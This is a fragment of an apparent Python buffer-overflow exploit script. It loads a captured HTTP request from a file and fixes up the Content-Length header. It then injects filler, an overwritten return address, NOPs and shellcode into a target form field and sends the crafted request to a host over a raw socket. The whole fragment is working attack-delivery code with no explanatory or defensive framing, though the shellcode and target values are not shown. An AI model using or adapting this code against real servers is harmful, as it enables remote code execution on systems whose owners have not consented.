try:
    print("Sending payload")
    buffer = ""
    reqf = open(sys.argv[1], 'r')
    line = reqf.readline().replace("\n","\r\n")
    while len(line) > 0:
        if len(line.split("Content-Length")) > 1:
            line = "Content-Length: {to modify}\r\n"
        if len(line.split(targetform)) > 1:
            content = targetform + "=" + filler + eip + offset + nops + shellcode + "&" + line.split(targetform)[1].split("&")[1]
            line = content
        buffer += line
        line = reqf.readline().replace("\n","\r\n")
    reqf.close()
    buffer = buffer.replace("{to modify}", str(len(content)))
    print(bytes(buffer, "latin1")) # debug
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))
    s.send(bytes(buffer, "latin1"))
    s.close()
except:
    print("\nFAIL : Could not connect")
    sys.exit(1)
print("\nSuccessfully sent")
